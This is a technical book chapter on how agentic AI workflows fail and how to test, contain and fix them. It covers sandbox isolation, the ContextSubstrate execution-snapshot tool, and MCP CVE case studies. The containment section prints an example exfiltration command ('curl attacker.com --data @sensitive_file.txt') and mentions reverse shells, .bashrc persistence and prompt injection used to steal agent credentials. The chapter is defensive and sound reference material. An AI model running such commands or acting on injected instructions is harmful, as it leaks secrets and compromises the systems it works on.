---
title: "Common Failure Modes, Testing, and Fixes"
order: 10
---

# Common Failure Modes, Testing, and Fixes

## Chapter Goals

By the end of this chapter, you should be able to recognise the most common ways agentic workflows fail in production, understanding the symptoms and root causes of each failure mode. You should be able to design a test strategy that catches failures before deployment, combining static checks, deterministic tests, and adversarial evaluations. You should be able to apply practical mitigation and recovery patterns that reduce mean time to recovery when failures occur. And you should be able to turn incidents into durable process and architecture improvements that prevent recurrence.

## Why Failures Are Different in Agentic Systems

Traditional software failures are often deterministic and reproducible. Agent failures can also include additional dimensions of complexity.

**Nondeterminism** arises from model sampling and external context, meaning the same input may produce different outputs across runs.

**Tool and API variance** occurs across environments and versions, where a tool that works in testing may behave differently in production.

**Instruction ambiguity** emerges when prompts, policy files, or skills conflict, leading agents to interpret guidance inconsistently.

**Long-horizon drift** describes behaviour that degrades over many steps, where small errors compound into significant deviations from intended outcomes.

This means reliability work must combine classic software testing with scenario-based evaluation and operational controls.

## Failure Taxonomy

Use this taxonomy to classify incidents quickly and choose the right fix path.

### 1) Planning and Reasoning Failures

**Symptoms.** The agent picks the wrong sub-goal, pursuing an objective that does not advance the overall task. It repeats work or loops without convergence, wasting resources on redundant operations. It produces plausible but invalid conclusions, generating output that sounds correct but fails validation.

**Typical causes.** Missing constraints in system instructions leave the agent without guidance on what to avoid. Overly broad tasks with no decomposition guardrails allow the agent to wander. No termination criteria means the agent does not know when to stop.

**Fast fixes.** Add explicit success criteria and stop conditions so the agent knows when it has succeeded. Break tasks into bounded steps that can be validated individually. Require intermediate checks before irreversible actions to catch errors early.

### 2) Tooling and Integration Failures

**Symptoms.** Tool calls fail intermittently, succeeding sometimes and failing others without obvious cause. Wrong parameters are passed to tools, causing unexpected behaviour. Tool output is parsed incorrectly, leading to downstream errors.

**Typical causes.** Schema drift or undocumented API changes mean the agent's assumptions no longer match reality. Weak input validation allows malformed requests to reach tools. Inconsistent retry and backoff handling causes cascading failures under load.

**Fast fixes.** Validate tool contracts at runtime to catch mismatches early. Add strict argument schemas that reject invalid inputs. Standardise retries with idempotency keys so repeated attempts are safe.

### 3) Context and Memory Failures

**Symptoms.** The agent forgets prior constraints, violating rules it was given earlier in the conversation. Important instructions are dropped when context grows, as the agent summarises away critical guidance. Stale memories override fresh data, causing the agent to act on outdated information.

**Typical causes.** Context window pressure forces the agent to discard information. Poor memory ranking and retrieval surfaces irrelevant content while burying important details. Missing recency and source-quality weighting treats all information as equally valid.

**Fast fixes.** Introduce context budgets and summarisation checkpoints that preserve critical information. Add citation requirements for retrieved facts so sources are traceable. Expire or down-rank stale memory entries so fresh information takes precedence.

### 4) Safety and Policy Failures

**Symptoms.** Sensitive files are modified unexpectedly, violating protected path policies. Security constraints are bypassed through tool chains, where combining multiple tools achieves an outcome that individual tools would block. Unsafe suggestions appear in generated code, introducing vulnerabilities.

**Typical causes.** Weak policy enforcement boundaries do not cover all attack surfaces. No pre-merge policy gates allow unsafe changes to reach the main branch. Implicit trust in generated output assumes agent output is safe without verification.

**Fast fixes.** Enforce allow and deny lists at the tool gateway level to prevent prohibited operations. Require policy checks in CI so violations are caught before merge. Route high-risk actions through human approval to ensure oversight.

#### Execution Environment Containment

Agent execution environments determine blast radius when things go wrong. Insufficient isolation allows a compromised or buggy agent to damage the host system, access sensitive data, or pivot to other systems. The containment strategy must match the risk profile of the code being executed.

**Shared-kernel risks.** Containerized agents (Docker, Podman) share the host kernel with other workloads. A kernel vulnerability or container escape gives the attacker access to everything on that host. This is acceptable for trusted code but insufficient for executing LLM-generated code or user-provided scripts where you cannot guarantee safety. Kernel exploits, though rare, have blast radius equal to the entire host.

**Credential exposure paths.** If secrets exist in the execution environment—as environment variables, mounted files, or in-memory—compromised agent code can exfiltrate them. A prompt injection attack that causes the agent to execute malicious code can then steal API keys, database credentials, or cloud access tokens. Examples include agents that `echo $API_KEY` to debug output that gets logged, or code that opens a reverse shell and exfiltrates environment state.

**Network exfiltration.** Without egress filtering, a compromised agent can send arbitrary data to attacker-controlled servers. This includes source code, user data, credentials, or internal system information. Even if credentials are protected, unrestricted networking allows data theft and command-and-control communication. A malicious agent might `curl attacker.com --data @sensitive_file.txt` or establish a persistent backdoor.

**Persistence and lateral movement.** If agent filesystems persist between runs or share state with other systems, malicious code can establish persistence or move laterally. An agent that writes to `/home/user/.bashrc` or modifies system cron jobs can survive restarts. One that accesses shared network filesystems can spread to other systems. Ephemeral, disposable execution environments prevent this by resetting to a clean state after every run.

**Examples of insufficient isolation:**

1. **Developer laptop execution:** Running untrusted agent code directly on a development machine with access to SSH keys, cloud credentials, and source repositories. A single prompt injection could compromise the entire development environment.

2. **Long-lived containers with secrets:** Agents that run in containers with environment variable secrets and no egress filtering. If the agent is compromised via prompt injection, attackers can exfiltrate credentials and pivot to cloud resources.

3. **Shared CI runners without sandboxing:** Using shared GitHub Actions runners or similar CI infrastructure to execute agent-generated code without additional isolation. A malicious PR could inject code that steals repository secrets or modifies other jobs.

**Appropriate containment strategies:**

For **low-risk scenarios** (trusted code, internal tools, read-only operations), process-level isolation or containers with basic security policies (seccomp, AppArmor) are sufficient. The convenience and ecosystem maturity outweigh isolation concerns.

For **medium-risk scenarios** (LLM-generated code, unknown code quality, limited external input), use containers with strict egress filtering, sealed secrets (never environment variables), and ephemeral filesystems. Add network policies that allowlist only required API endpoints.

For **high-risk scenarios** (user-provided code, untrusted input, access to sensitive data), use microVMs or full VMs with network-layer secret injection, default-deny networking, and fully disposable filesystems. No credentials should ever exist inside the execution environment. Consider transparent proxies that inject credentials at the network boundary, as discussed in [Agentic Scaffolding](030-scaffolding.md#secure-execution-environments).

**Validation before deployment:**

Before running agent code in production, verify that:
- Protected paths (credentials, system files, configuration) are read-only or inaccessible
- Egress filtering blocks all destinations except explicitly allowed API endpoints
- Secrets are not present in the environment or filesystem
- Filesystem changes do not persist between runs
- Resource limits (CPU, memory, disk) prevent denial-of-service
- Execution timeouts prevent runaway processes

Test these controls by intentionally trying to violate them. An agent that cannot bypass its own sandboxing is ready for production. One that can needs stronger isolation before it handles real workloads.

### 5) Collaboration and Workflow Failures

**Symptoms.** Multiple agents make conflicting changes, overwriting each other's work. PRs churn with contradictory edits as agents undo each other's modifications. Work stalls due to unclear ownership, with no agent taking responsibility.

**Typical causes.** Missing orchestration contracts leave agents without coordination rules. No lock or lease model for shared resources allows concurrent modification. Role overlap without clear handoff rules creates ambiguity about who should act.

**Fast fixes.** Add ownership rules per path or component so responsibilities are clear. Use optimistic locking with conflict resolution policy to handle concurrent access. Define role-specific done criteria so agents know when to stop.

## Testing Strategy for Agentic Workflows

A robust strategy uses multiple test layers. No single test type is sufficient.

## 1. Static and Structural Checks

Use static and structural checks to fail fast before expensive model execution. These include markdown and schema validation for instruction files, ensuring they are well-formed before agents try to parse them. Prompt template linting catches common errors in prompt construction. Tool interface compatibility checks verify that agents can call the tools they expect. Dependency and version constraint checks ensure the environment matches expectations.

## 2. Deterministic Unit Tests (Without LLM Calls)

Test orchestration logic, parsers, and guards deterministically without involving language models. Cover state transitions to ensure the workflow moves through stages correctly. Test retry and timeout behaviour to verify failure handling works as expected. Verify permission checks to ensure access controls are enforced. Test conflict resolution rules to confirm agents handle concurrent access correctly.

> **Snippet status:** Runnable shape (simplified for clarity).

```python
from dataclasses import dataclass

@dataclass
class StepResult:
    ok: bool
    retryable: bool


def should_retry(result: StepResult, attempt: int, max_attempts: int = 3) -> bool:
    return (not result.ok) and result.retryable and attempt < max_attempts


def test_retry_policy():
    assert should_retry(StepResult(ok=False, retryable=True), attempt=1)
    assert not should_retry(StepResult(ok=False, retryable=False), attempt=1)
    assert not should_retry(StepResult(ok=False, retryable=True), attempt=3)
```

## 3. Recorded Integration Tests (Golden Traces)

Capture representative interactions and replay them against newer builds. Record tool inputs and outputs to create a reproducible baseline. Freeze external dependencies where possible to eliminate variance. Compare final artefacts and decision traces to detect changes in behaviour.

Use these to detect drift in behaviour after prompt, tool, or model changes.

## 3a. Reproducible Execution Infrastructure

### The Agent Debugging Challenge

Traditional debugging relies on deterministic execution: run the same code with the same inputs, and you get the same result. Agent debugging breaks this model in several ways.

**Nondeterminism across runs.** Model temperature, sampling, and API variance mean the same prompt may produce different tool calls, different reasoning chains, and different final outputs. A bug that appears in production may not reproduce in your local environment, even with identical inputs.

**Long-horizon failures.** Many agent tasks span dozens or hundreds of steps—API calls, file modifications, reasoning chains, multi-turn conversations. When the agent fails at step 47, understanding what happened requires reconstructing 46 prior steps. Traditional logs capture outputs but not the complete decision context at each step.

**Distributed tool chains.** Agents coordinate multiple tools—code interpreters, web browsers, database clients, external APIs—each with their own state and side effects. A failure in one tool affects downstream steps, but the causal chain may not be obvious from isolated tool logs.

**Manual incident reconstruction.** When an agent fails in production, teams typically grep through verbose logs, manually correlate timestamps, and try to piece together what happened. There is no standard workflow for replaying an agent execution to see exactly what it did and why.

What is needed is a systematic approach: version control for agent execution artifacts that makes runs reproducible, debuggable, and auditable using developer-native primitives.

### Content-Addressed Execution Snapshots

The core insight is to treat agent executions as immutable, tamper-evident artifacts rather than ephemeral logs. This approach borrows from git's object model: every execution snapshot is identified by a cryptographic hash of its contents, making it deduplicatable and verifiable.

**Execution snapshot structure.** An execution snapshot captures the complete state of an agent run:

- **Inputs**: Initial prompt, tool parameters, environment configuration, model version
- **Steps**: Sequence of tool calls with arguments, model responses, intermediate state changes
- **Outputs**: Final results, generated artifacts, error messages if failed
- **Metadata**: Timestamps, execution duration, cost metrics, model versions used

Each snapshot is self-contained: everything needed to understand the execution is in the snapshot, not scattered across multiple log files or external systems.

**Content-addressing fundamentals.** A content-addressed system uses cryptographic hashes (typically SHA-256) as identifiers. The hash is computed from the snapshot contents, which means:

- **Deduplication**: Identical executions produce identical hashes, so they are stored once
- **Tamper-evidence**: Changing any byte of the snapshot changes its hash, making modifications detectable
- **Integrity verification**: You can verify a snapshot matches its hash without trusting the storage system
- **Efficient diffing**: Comparing two executions means comparing their hashes and their structured contents

**Comparison to git's object model.** Git stores blobs (file contents), trees (directory structures), and commits (snapshots with metadata). Execution snapshots follow the same pattern:

- **Blobs** = execution logs (structured JSON capturing inputs, steps, outputs)
- **Commits** = context packs (immutable snapshots with hash identifiers)
- **Diffs** = structural comparisons showing what changed between executions
- **History** = chain of execution snapshots linked by parent references

This means developers already understand the mental model. If you know `git log`, `git show`, and `git diff`, you can apply the same workflows to agent execution history.

### ContextSubstrate: Git-Like Workflows for Agent Execution

**ContextSubstrate** (`ctx`) is an execution substrate that implements content-addressed execution snapshots with git-like CLI workflows. Released February 2026 under MIT license, it provides developer-native infrastructure for making agent work reproducible and debuggable.

**Storage model.** ContextSubstrate uses a `.ctx/` directory (analogous to `.git/`) with a blob store and pack registry:

```
.ctx/
├── blobs/           # Content-addressed execution logs
│   ├── 7a/3f8e... # Execution log blob (SHA-256)
│   └── 9c/d12a... # Another execution log
├── packs/           # Context pack metadata
│   └── pack-abc123.json
└── config           # Configuration and remote settings
```

**Core workflows with CLI examples.**

**Initialize execution tracking:**
```bash
# Create .ctx/ directory in project root
ctx init
```

**Create immutable execution snapshot:**
```bash
# Pack an execution log into a context pack
ctx pack execution-log.json
# Output: Created pack 7a3f8e92 (execution-log.json)
```

**View execution history:**
```bash
# List all execution snapshots
ctx log
# Output:
# 7a3f8e92 2026-02-16 14:30 Completed: Process invoice data
# 9cd12ab5 2026-02-16 14:15 Failed: Database connection timeout
# 4fe89c01 2026-02-16 14:00 Completed: Generate quarterly report
```

**Inspect execution details:**
```bash
# Show complete execution snapshot
ctx show 7a3f8e92
# Output: JSON structure with inputs, steps, outputs, metadata
```

**Compare executions:**
```bash
# Diff two execution snapshots
ctx diff 7a3f8e92 9cd12ab5
# Output: Structural diff showing differences in steps, outputs, errors
```

**Reproduce execution (best-effort):**
```bash
# Replay execution from snapshot
ctx replay 7a3f8e92
# Note: Replay is best-effort due to external API variance
```

**Validate integrity:**
```bash
# Verify snapshot has not been tampered with
ctx verify 7a3f8e92
# Output: OK (hash matches) or FAILED (tampering detected)
```

**Create variant execution:**
```bash
# Fork execution snapshot to test alternative strategies
ctx fork 7a3f8e92 --set prompt="Use aggressive caching"
# Output: Created forked pack c3a7f9e1
```

**Integration pattern: Wrapping LangChain executions.**

Agents must output structured execution logs in JSON format for ContextSubstrate to pack them. Here is a Python pseudo-code example showing how to integrate with LangChain:

```python
import json
from datetime import datetime
from langchain.agents import AgentExecutor

class ContextSubstrateLogger:
    """Logs LangChain agent execution in ContextSubstrate format"""

    def __init__(self, agent_executor: AgentExecutor):
        self.executor = agent_executor
        self.log = {
            "inputs": {},
            "steps": [],
            "outputs": {},
            "metadata": {
                "start_time": None,
                "end_time": None,
                "model": "gpt-4",
                "framework": "langchain"
            }
        }

    def run(self, prompt: str) -> dict:
        """Execute agent and capture execution log"""
        self.log["inputs"]["prompt"] = prompt
        self.log["metadata"]["start_time"] = datetime.utcnow().isoformat()

        # Run agent with callback to capture intermediate steps
        result = self.executor.invoke(
            {"input": prompt},
            callbacks=[self._step_callback]
        )

        self.log["outputs"]["result"] = result
        self.log["metadata"]["end_time"] = datetime.utcnow().isoformat()

        # Write execution log to file
        log_path = f"execution-{datetime.utcnow().timestamp()}.json"
        with open(log_path, "w") as f:
            json.dump(self.log, f, indent=2)

        return {"result": result, "log_path": log_path}

    def _step_callback(self, step_output):
        """Capture intermediate step"""
        self.log["steps"].append({
            "tool": step_output.tool,
            "args": step_output.tool_input,
            "output": step_output.observation,
            "timestamp": datetime.utcnow().isoformat()
        })

# Usage
from langchain.agents import create_openai_functions_agent
from langchain_openai import ChatOpenAI

llm = ChatOpenAI(model="gpt-4", temperature=0)
agent = create_openai_functions_agent(llm, tools=[...])
executor = AgentExecutor(agent=agent, tools=[...])

# Wrap executor with ContextSubstrate logger
logger = ContextSubstrateLogger(executor)
result = logger.run("What is the weather in San Francisco?")

# Pack execution into ContextSubstrate
# $ ctx pack execution-1708096800.json
```

This pattern works with any agent framework: capture execution details in structured JSON, then pack them with `ctx pack`.

### Production Use Cases

**Incident investigation: Reconstructing failure sequences.**

When an agent fails in production, the execution snapshot provides a complete reconstruction. Instead of grepping logs, you run `ctx show <pack-id>` to see exactly what inputs were provided, which tools were called with what arguments, and where the failure occurred. This reduces incident investigation time from hours to minutes.

Example: An agent repeatedly fails to generate valid SQL queries in production but works in testing. Using `ctx diff` between passing and failing executions reveals that production input includes Unicode characters that the prompt template does not handle correctly. The fix (input sanitization) is obvious once you can compare executions side-by-side.

**Regression testing: Diffing execution patterns before and after changes.**

Before deploying a prompt change or model upgrade, you can pack baseline executions, apply the change, run new executions, and diff them with `ctx diff`. If the new version produces different tool calls or skips steps, you catch it before production.

Example: You upgrade from GPT-4 to GPT-4-Turbo. After packing 100 executions from each model version, `ctx diff` reveals that Turbo skips a validation step 15% of the time. This regression is caught in staging, preventing production incidents.

**Compliance audits: Immutable provenance chains.**

Regulated industries (healthcare, finance) require tamper-evident audit trails. ContextSubstrate provides this natively: every execution snapshot is content-addressed, making it cryptographically verifiable. Auditors can verify that execution logs have not been modified after the fact.

Example: A financial services company uses agents to generate compliance reports. Regulators require proof that agent decisions were made based on specific data inputs. The company provides context packs (execution snapshots) with SHA-256 hashes. Auditors verify integrity with `ctx verify`, confirming the execution logs are authentic.

**A/B testing: Forking execution snapshots to test alternatives.**

Instead of re-running agents from scratch, you can fork an existing execution and modify parameters (prompt, model, tool selection) to test alternative strategies. This is faster than full re-execution and preserves the baseline for comparison.

Example: An agent uses a conservative prompt that produces correct but verbose output. You fork an execution (`ctx fork <pack-id> --set prompt="Be concise"`), run the modified version, and compare outputs. If the concise version maintains correctness, you adopt it. If not, you discard the fork without affecting production.

**Debugging long-horizon failures: Replaying multi-step sequences.**

When an agent fails at step 47 of a 50-step workflow, replaying the entire execution lets you isolate the error point. ContextSubstrate replay is best-effort (external APIs may return different results), but it validates the execution structure: which steps ran, in what order, with what arguments.

Example: A multi-agent workflow corrupts data in the final step. Replaying the execution with `ctx replay <pack-id>` reveals that Agent B's output (step 34) contains malformed JSON that Agent C fails to parse (step 47). The fix (add JSON validation after Agent B) is obvious once you see the complete execution sequence.

### Integration and Operational Considerations

**Logging overhead.** Capturing structured execution logs adds 5-15% overhead compared to no logging. This is acceptable for production workloads where debuggability matters. For high-throughput, low-latency scenarios (real-time chat, sub-second responses), enable selective logging: pack only failed executions or sampled successes.

**Storage requirements.** Context packs are typically 50-200 KB per execution (compressed JSON). Content-addressing deduplicates repeated patterns, so 1000 similar executions might consume only 10-20 MB. For production systems with thousands of executions per day, allocate 1-5 GB storage per week. Implement retention policies: keep all failures indefinitely, expire successes after 30 days.

**Replay fidelity.** Execution replay is **best-effort**, not bit-identical. External APIs may return different results (weather changes, database state evolves). Model responses vary due to temperature and sampling. Replay validates **execution structure** (which steps ran, which tools were called) but not output identity. Use replay to debug control flow, not to verify exact outputs.

**When to use ContextSubstrate:**
- High-value executions requiring audit trails (compliance, finance, healthcare)
- Production incidents where root cause analysis is expensive
- Regression testing before model or prompt upgrades
- Multi-agent workflows with complex state dependencies

**When not to use:**
- Ephemeral dev testing where debuggability does not matter
- Low-stakes prototyping with no production consequences
- Real-time latency-sensitive applications where 5-15% overhead is unacceptable
- Fully deterministic workflows with no external API dependencies (traditional unit tests suffice)

**Framework integration patterns.** ContextSubstrate works with any agent framework that can output structured JSON execution logs. Integration approaches:

- **Middleware approach**: Wrap agent executor with logging middleware (shown in LangChain example above)
- **Execution hooks**: Use framework callbacks to capture steps as they execute
- **Structured logging wrappers**: Adapt existing logging libraries (Python `logging`, `structlog`) to output ContextSubstrate-compatible JSON

For frameworks with built-in tracing (OpenAI Agents SDK, LangSmith), export traces to JSON and pack them with `ctx pack`.

### Limitations and Future Directions

**Not real-time monitoring.** ContextSubstrate is a post-hoc analysis tool. It does not provide live observability dashboards or alerting. For real-time monitoring, use OpenTelemetry, Prometheus, or LangSmith tracing. ContextSubstrate complements these tools by providing debuggable execution snapshots after incidents occur.

**Not version control for code.** ContextSubstrate versions **execution artifacts**, not source code or prompts. Git versions prompts, configuration, and agent code. ContextSubstrate versions what happened when that code ran. Use both: git for code history, ContextSubstrate for execution history.

**Not an orchestration framework.** ContextSubstrate does not run agents—it captures their execution. It is complementary to LangChain, AutoGen, OpenAI Agents SDK, not a replacement. Think of it as middleware that adds reproducibility to existing agent systems.

**Emerging pattern, limited adoption.** ContextSubstrate was released February 2026 and is used in production by OpenRudder (ambient agent framework) and early adopters. Broader ecosystem adoption is still developing. Python wrappers, remote sharing (push/pull context packs), signing (cryptographic provenance), and UI tooling are planned but not yet available. Treat this as an emerging pattern worth watching rather than an established standard.

**Future directions.** The pattern of version-controlled agent execution is likely to become standard as agents move into production. Expect convergence toward:

- **Federated execution registries**: Share context packs across teams and organizations
- **Standardized execution log formats**: Common JSON schema for agent execution snapshots
- **Integration with supply-chain provenance**: Link execution snapshots to SLSA attestations and in-toto policies
- **Agent execution replay environments**: Deterministic sandboxes that improve replay fidelity

For broader context on observability and evaluation trends, see [Agent Observability and Evaluation](800-future-developments.md#agent-observability-and-evaluation). For infrastructure foundations, see [Agentic Scaffolding](030-scaffolding.md#secure-execution-environments). For content-addressing background, see [Discovery and Imports](050-discovery-imports.md).

## 4. Scenario and Adversarial Evaluations

Design "challenge suites" for known weak spots. These should include ambiguous requirements that could be interpreted multiple ways, contradictory documentation that forces the agent to choose, missing dependencies that test error handling, and partial outages and degraded APIs that test resilience. Include prompt-injection attempts in retrieved content to test security boundaries.

Pass criteria should include not just correctness, but also policy compliance, cost and latency ceilings, and evidence quality including citations and rationale.

## 5. Production Guardrail Tests

Before enabling autonomous writes and merges in production, validate that guardrails work correctly. Protected-path enforcement should block modifications to sensitive files. Secret scanning and licence checks should catch policy violations. Human approval routing should engage for high-impact actions. Rollback paths should work on failed deployments.

## Case Study: MCP Supply-Chain Vulnerabilities in Practice

Two 2025 incidents illustrate how protocol-level vulnerabilities propagate through agentic systems.

**CVE-2025-6514 (`mcp-remote` OS command injection, CVSS 9.6).** The `mcp-remote` npm package (versions 0.0.5 through 0.1.15), used by over 437,000 AI development environments, contained an OS command injection flaw. When connecting to an untrusted MCP server, the server could craft a malicious `authorization_endpoint` URL that, when processed by the client's `open()` function, executed arbitrary operating-system commands. The vulnerability required user interaction but no authentication. JFrog Security Research discovered and reported it; the fix (version 0.1.16) sanitised special elements in authorisation responses. The lesson: MCP client packages that handle authentication flows from external servers must treat every server response as untrusted input.

**CVE-2025-68145/68143/68144 (Anthropic Git MCP server, RCE chain).** Three flaws in `mcp-server-git` (prior to version 2025.12.18) combined into a remote-code-execution chain. CVE-2025-68145 (CVSS 7.1) bypassed the `--repository` flag's path restrictions, allowing access to any repository on the system. CVE-2025-68143 let `git_init` create repositories at arbitrary filesystem paths. CVE-2025-68144 injected arguments through unsanitised `git_diff` and `git_checkout` parameters, enabling file overwrites. Researchers at Cyata demonstrated that chaining these flaws with a Filesystem MCP server allowed writing malicious Git smudge/clean filters that achieved full code execution. Anthropic patched all three in December 2025. The lesson: individual MCP tools may appear safe in isolation, but **tool chaining creates exponential attack surface**—security boundaries must be enforced at every tool invocation, not just at initialisation.

Both incidents validate the OWASP MCP Top 10 and reinforce that MCP server/client security is now a production concern, not a theoretical exercise. For governance context, see [Governance and Safety Automation](800-future-developments.md#governance-and-safety-automation).

## Practical Fix Patterns

When incidents happen, reusable fix patterns reduce MTTR (mean time to recovery).

### Pattern A: Contract Hardening

Add strict schemas between planner and tool runner to ensure they communicate correctly. Reject malformed or out-of-policy requests early, before they can cause harm. Version contracts (`v1`, `v2`) and support migrations so changes can be rolled out incrementally.

### Pattern B: Progressive Autonomy

Start in "suggest-only" mode where agents propose changes but do not execute them. Move to "execute with review" mode once confidence builds. Graduate to autonomous mode only after SLO compliance demonstrates the agent is reliable.

### Pattern C: Two-Phase Execution

In the **plan phase**, generate proposed actions and expected effects without executing anything. In the **apply phase**, execute only after policy and validation checks pass. This reduces irreversible mistakes and improves auditability.

### Pattern D: Fallback and Circuit Breakers

If tool failure rate spikes, disable affected paths automatically to prevent cascading failures. Fall back to a safer baseline workflow that may be less capable but more reliable. Alert operators with incident context so they can investigate and resolve the underlying issue.

### Pattern E: Human-in-the-Loop Escalation

Define explicit escalation triggers that route work to humans. Repeated retries without progress indicate the agent is stuck. Any request touching protected paths should require approval. Low-confidence output in high-risk domains warrants human review.

## Incident Response Runbook (Template)

Use a lightweight runbook so teams respond consistently. The sequence proceeds through eight steps.

**Detect.** Receive an alert from CI, runtime monitor, or user report indicating something has gone wrong.

**Classify.** Map the incident to a taxonomy category so you can apply the appropriate response playbook.

**Contain.** Stop autonomous actions if the blast radius is unclear, preventing further damage while you investigate.

**Diagnose.** Reproduce the issue with a trace and configuration snapshot to understand what happened.

**Mitigate.** Apply short-term guardrails or fallbacks to restore service while you work on a permanent fix.

**Fix.** Implement a structural correction that addresses the root cause.

**Verify.** Re-run affected test suites and adversarial cases to confirm the fix works.

**Learn.** Add a regression test and update documentation to prevent recurrence.

## Metrics That Actually Matter

Track these metrics to evaluate reliability improvements over time.

**Task success rate** measures how often agents complete tasks correctly, with policy compliance as part of success. **Intervention rate** measures how often humans must correct the agent, indicating where automation falls short. **Escaped defect rate** measures failures discovered after merge or deploy, indicating gaps in pre-production testing. **Mean time to detect (MTTD)** and **mean time to recover (MTTR)** measure incident response effectiveness. **Cost per successful task** and **latency percentiles** measure efficiency.

Avoid vanity metrics (for example, "number of agent runs") without quality and safety context.

## Anti-Patterns to Avoid

Several anti-patterns undermine agentic system reliability.

**Treating prompt edits as sufficient reliability work** ignores the structural issues that cause failures. Prompts can only do so much; robust systems need architectural controls.

**Allowing autonomous writes without protected-path policies** exposes critical files to unintended modification. Every system needs explicit boundaries.

**Skipping regression suites after model or version upgrades** assumes backward compatibility that may not exist. Changes require validation.

**Relying on a single benchmark instead of diverse scenarios** creates blind spots. Real-world failures often occur in edge cases the benchmark does not cover.

**Ignoring ambiguous ownership in multi-agent flows** leads to gaps and conflicts. Every path and component should have a clear owner.

## A Minimal Reliability Checklist

Before enabling broad production use, confirm the following items are complete. Snippets and examples should be clearly labelled as runnable, pseudocode, or simplified. Tool contracts should be versioned and validated. CI should include policy, security, and regression checks. Failure injection scenarios should be part of routine testing. Rollback and escalation paths should be documented and exercised.

## Applying This to This Repository

For this repository, a minimal operational checklist is:

- Run `python3 scripts/check-links.py --root book --mode internal` for any `book/` content change.
- Keep `.github/workflows/*.md` and `.github/workflows/*.lock.yml` in sync when GH-AW source workflows change.
- Validate label lifecycle behavior against `WORKFLOW_PLAYBOOK.md` after workflow edits.
- Preserve least-privilege + `safe-outputs` patterns in GH-AW workflow frontmatter.
- Use a repository-scoped user token for safe-outputs writes when label events must trigger downstream workflows.
- Scope dispatch-workflow concurrency by issue identifier to prevent burst-trigger cancellations.
- Treat workflow-generated failure tracker issues as operations artifacts, not content suggestions.
- Validate lifecycle paths sequentially before burst/concurrency tests.
- Treat failed Pages/PDF runs as release blockers for documentation changes.

For orchestration context, see [Agent Orchestration](020-orchestration.md). For infrastructure boundaries, see [Agentic Scaffolding](030-scaffolding.md).

## Chapter Summary

Reliable agentic systems are built, not assumed. Teams that combine clear contracts, layered testing, progressive autonomy, strong policy gates, and incident-driven learning consistently outperform teams relying on prompt-only tuning.

In practice, your competitive advantage comes from how quickly you detect, contain, and permanently fix failures—not from avoiding them entirely.

<!-- Edit notes:
Sections expanded: Chapter Goals, Why Failures Are Different in Agentic Systems, all five failure taxonomy sections (Planning and Reasoning, Tooling and Integration, Context and Memory, Safety and Policy, Collaboration and Workflow), Static and Structural Checks, Deterministic Unit Tests, Recorded Integration Tests, Scenario and Adversarial Evaluations, Production Guardrail Tests, all five Pattern sections (Contract Hardening, Progressive Autonomy, Two-Phase Execution, Fallback and Circuit Breakers, Human-in-the-Loop Escalation), Incident Response Runbook, Metrics That Actually Matter, Anti-Patterns to Avoid, A Minimal Reliability Checklist, Chapter Summary
Lists preserved: Code block (must remain as-is for runnable example), checklist format for Minimal Reliability Checklist (intentionally kept as checklist for usability)
Ambiguous phrases left ambiguous: None identified
-->
